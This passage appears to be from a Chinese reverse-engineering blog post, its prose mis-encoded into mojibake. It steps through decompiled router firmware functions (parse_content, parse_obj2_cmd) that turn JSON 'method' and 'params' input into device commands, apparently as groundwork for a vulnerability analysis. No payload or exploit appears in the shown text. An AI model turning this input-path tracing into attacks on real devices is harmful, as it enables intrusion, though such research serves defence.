class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readæ¥æ”¶æ•°æ®å°†æ•°æ®æ”¾åˆ°addrä¸Šï¼Œä¹‹å</p><p>ä¸»è¦å°±æ˜¯è°ƒç”¨è¿™ä¸ªif</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‡½æ•°parse_content</p><h4 id="parse-content"><a href="#parse-content" class="headerlink" title="parse_content"></a>parse_content</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_content</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> json; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> *v12; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v14; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+20h] [-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> device; <span class="comment">// [sp+24h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+28h] [-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> method; <span class="comment">// [sp+2Ch] [-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">598</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  v3 = json_tokener_parse();                    <span class="comment">// è§£æjsonæ•°æ®</span></span><br><span class="line">  json = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">605</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)para invalid!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;params) != <span class="number">1</span> )<span class="comment">// æå–paramæ•°æ®</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;device&quot;</span>, &amp;device) == <span class="number">1</span> &amp;&amp; json_object_get_type(device) == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(device);</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)caller:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">621</span>, <span class="built_in">string</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;method) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">    json_object_put(json);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string = json_object_get_string(method);</span><br><span class="line">  <span class="keyword">if</span> ( !method_string )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)Get method failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;cmdArr&quot;</span>) )        <span class="comment">// å¦‚æœmethodåŒ…å«cmdArrï¼Œæ˜¾ç„¶ä¸åŒ…å«</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = params;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(v8, <span class="string">&quot;params&quot;</span>, &amp;v16) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v10 = json_object_array_length(v16);</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = v10;</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      idx = json_object_array_get_idx(v16, v9);</span><br><span class="line">      <span class="keyword">if</span> ( idx )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">654</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = parse_obj2_cmd(idx, <span class="built_in">string</span>);</span><br><span class="line">        *v12 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">659</span>);</span><br><span class="line">          json_object_put(json);</span><br><span class="line">          free_cmd(v12);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pkg_add_cmd(a1, v12);</span><br><span class="line">        v12[<span class="number">2</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = <span class="number">1</span>;</span><br><span class="line">    v14 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = parse_obj2_cmd(json, <span class="built_in">string</span>);</span><br><span class="line">    *v14 = addr;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">679</span>);</span><br><span class="line">      free_cmd(v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v14);</span><br><span class="line">    v14[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  json_object_put(json);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®—æ˜¯åˆæ­¥è§£æjsonæ•°æ®ï¼Œç„¶åè°ƒç”¨parse_obj2_cmdå‡½æ•°</p><h4 id="parse-obj2-cmd"><a href="#parse-obj2-cmd" class="headerlink" title="parse_obj2_cmd"></a>parse_obj2_cmd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_obj2_cmd</span><span class="params">(<span class="type">int</span> json, <span class="type">int</span> string_0)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> ptr_2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> method_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// dc</span></span><br><span class="line">  _BYTE *v25; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v27; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v28; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v29; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v30; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v31; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v32; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v33; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v34; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v39; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v40; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> params_module; <span class="comment">// [sp+20h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+24h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  ptr_2 = ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory is full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">276</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  <span class="keyword">if</span> ( string_0 )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">16</span>) = strdup(string_0);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;module&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">    || (method_1 = json_object_get_string(params_module), (method_2 = method_1) == <span class="number">0</span>)</span><br><span class="line">    || <span class="built_in">strcmp</span>(method_1, <span class="string">&quot;esw&quot;</span>) )                <span class="comment">// æ˜¾ç„¶è¿›å…¥</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    method_string = json_object_get_string(params_module);</span><br><span class="line">    v16 = method_string;</span><br><span class="line">    <span class="keyword">if</span> ( !method_string )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)s_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">2</span>;                                  <span class="comment">// æˆç«‹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v16, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, (<span class="type">const</span> <span class="type">char</span> *)dword_41FA70, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">LABEL_46:</span><br><span class="line">          v18 = <span class="built_in">strchr</span>(v16, <span class="number">46</span>);</span><br><span class="line">          v19 = strdup(v18 + <span class="number">1</span>);</span><br><span class="line">          *(_DWORD *)(ptr_2 + <span class="number">4</span>) = v19;</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">          <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;params&quot;</span>, &amp;params) == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;module&quot;</span>, &amp;params_module) == <span class="number">1</span> 